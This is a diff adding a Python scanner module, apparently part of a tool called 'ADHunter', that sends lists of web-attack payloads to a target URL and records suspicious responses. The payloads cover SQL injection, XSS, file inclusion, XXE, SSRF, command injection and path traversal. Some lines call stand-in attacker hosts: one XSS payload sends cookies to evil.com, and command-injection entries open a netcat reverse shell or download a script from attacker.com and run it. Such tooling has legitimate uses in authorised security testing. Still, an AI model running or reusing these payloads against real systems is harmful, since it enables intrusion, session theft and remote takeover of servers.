@@ -1,0 +1,175 @@
+import requests
+from urllib.parse import urlparse, parse_qs, urlencode
+
+payloads = {
+    "SQLi": [
+        "' OR 1=1 --",
+        "' UNION SELECT NULL,NULL,NULL --",
+        "' AND SLEEP(5) --",
+        "'; WAITFOR DELAY '0:0:5' --",
+        "' OR 'a'='a",
+        "'; SELECT pg_sleep(5); --",
+        "' OR 1=1; --",
+        "' AND 1=0 UNION SELECT NULL,NULL,NULL --",
+        "'||UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--",
+        "' OR 1=1#",
+        "' OR '1'='1'--",
+        "' OR '1'='1' ({",
+        "' OR '1'='1' /*",
+        "' OR 1=1--",
+        "' OR 1=1#",
+        "' OR 1=1/*",
+        "' OR '1'='1'--",
+        "' OR '1'='1'#",
+        "' OR '1'='1'/*",
+        "' OR 1=1 LIMIT 1; --",
+        "' OR 1=1 ORDER BY 1; --",
+        "' OR 1=1 ORDER BY 100; --",
+        "' OR 1=1 GROUP BY 1; --",
+        "' OR 1=1 GROUP BY 100; --",
+        "' OR 1=1 HAVING 1=1; --",
+        "' OR 1=1 HAVING 1=0; --",
+        "' OR 1=1 UNION SELECT 1,2,3; --",
+        "' OR 1=1 UNION SELECT NULL,NULL,NULL; --",
+        "' OR 1=1 UNION SELECT username,password FROM users; --",
+        "' OR 1=1 UNION SELECT table_name,column_name FROM information_schema.columns; --",
+        "' OR 1=1 UNION SELECT version(); --",
+        "' OR 1=1 UNION SELECT @@version; --",
+        "' OR 1=1 UNION SELECT user(); --",
+        "' OR 1=1 UNION SELECT database(); --",
+        "' OR 1=1 UNION SELECT schema_name FROM information_schema.schemata; --",
+        "' OR 1=1 UNION SELECT table_name FROM information_schema.tables; --",
+        "' OR 1=1 UNION SELECT column_name FROM information_schema.columns; --",
+        "' OR 1=1 UNION SELECT NULL,NULL,NULL; --",
+        "' OR 1=1 UNION SELECT --",
+    ],
+    "XSS": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(document.domain)</script>",
+        "'><img src=x onerror=alert(1)>",
+        "<svg/onload=alert(1)>",
+        "<body onload=alert('XSS')>",
+        "<iframe src='javascript:alert(1)'>",
+        "<math><mtext></title><script>alert(1)</script>",
+        "<script src=//evil.com/xss.js></script>",
+        "<img src='x' onerror='fetch(`//evil.com/?c=`+document.cookie)'>",
+        "<video><source onerror='alert(1)'>",
+        "<object data='javascript:alert(1)'>",
+        "<a href='javas&#99;ript:alert(1)'>Click</a>",
+        "<input autofocus onfocus=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<textarea autofocus onfocus=alert(1)>",
+        "<button formaction='javascript:alert(1)'>Click</button>"
+    ],
+    "LFI": [
+        "../../../../../../etc/passwd",
+        "/../../../../../../etc/passwd%00",
+        "../../../../../../etc/shadow",
+        "../../../../../../windows/win.ini",
+        "../../../../../../boot.ini",
+        "../../../../../../../../../../var/log/apache2/access.log",
+        "../../../../../../proc/self/environ",
+        "../../../../../../../../../etc/hosts",
+        "../../../../../../../../../../../../etc/passwd%00.jpg",
+        "../../../../../../etc/passwd%00",
+        "../" * 10 + "etc/passwd"
+    ],
+    "RFI": [
+        "http://evil.com/shell.txt",
+        "https://attacker.com/malicious.php",
+        "//evil.com/rfi.txt",
+        "http://127.0.0.1/test.txt",
+        "http://evil.com/?cmd=ls",
+        "http://evil.com/evil.js",
+        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "https://raw.githubusercontent.com/user/malware/master/backdoor.php"
+    ],
+    "XXE": [
+        """<?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+        <foo>&xxe;</foo>""",
+        """<?xml version="1.0"?>
+        <!DOCTYPE root [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
+        %dtd;
+        ]>
+        <data>&send;</data>"""
+    ],
+    "SSRF": [
+        "http://127.0.0.1:80",
+        "http://localhost:80",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://internal-service",
+        "http://127.0.0.1/admin",
+        "http://127.0.0.1:8000/debug",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:11211/_stats",
+        "http://127.0.0.1:2375/v1.24/containers/json",
+        "http://[::]:80"
+    ],
+    "Command Injection": [
+        "test; whoami",
+        "test && id",
+        "test || ls -la",
+        "`cat /etc/passwd`",
+        "$(sleep 5)",
+        "| ping -c 4 127.0.0.1",
+        "& net user",
+        "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "| nc attacker.com 4444 -e /bin/bash",
+        "& curl http://attacker.com/payload.sh | sh"
+    ],
+    "Path Traversal": [
+        "../../etc/passwd",
+        "../windows/win.ini",
+        "../../../boot.ini",
+        "../../../../../../../../etc/shadow",
+        "../../../../../../../../etc/hosts",
+        "../../../../../../../../../var/log/apache2/access.log",
+        "../../../../../../../../../../../../../../etc/passwd%00",
+        "../../../../../../../../../../../../etc/passwd%00.jpg"
+    ]
+}
+def test_payloads(target_url, method='POST', param='input'):
+    results = []
+    headers = {
+        'User-Agent': 'ADHunter/IntrusiveModule',
+        'X-Original-URL': '/admin',
+        'X-Custom-IP-Authorization': '127.0.0.1'
+    }
+
+    for category, plist in payloads.items():
+        for payload in plist:
+            data = {param: payload}
+            try:
+                if method.upper() == "POST":
+                    response = requests.post(target_url, data=data, headers=headers, timeout=10)
+                else:
+                    parsed_url = urlparse(target_url)
+                    query = parse_qs(parsed_url.query)
+                    query[param] = payload
+                    full_query = urlencode(query, doseq=True)
+                    full_url = parsed_url._replace(query=full_query).geturl()
+                    response = requests.get(full_url, headers=headers, timeout=10)
+
+                if any(keyword in response.text.lower() for keyword in [
+                    "error", "alert", "root", "admin", "passwd",
+                    "meta-data", "uid=", "DOCTYPE", "syntax", "shadow", "ping", "uid=", "root:x:", "xml", "eval"
+                ]):
+                    results.append({
+                        'categoria': category,
+                        'payload': payload,
+                        'url': target_url,
+                        'metodo': method.upper()
+                    })
+
+            except requests.exceptions.RequestException as e:
+                results.append({
+                    'categoria': category,
+                    'payload': payload,
+                    'error': str(e)
+                })
+
+    return results
+	 
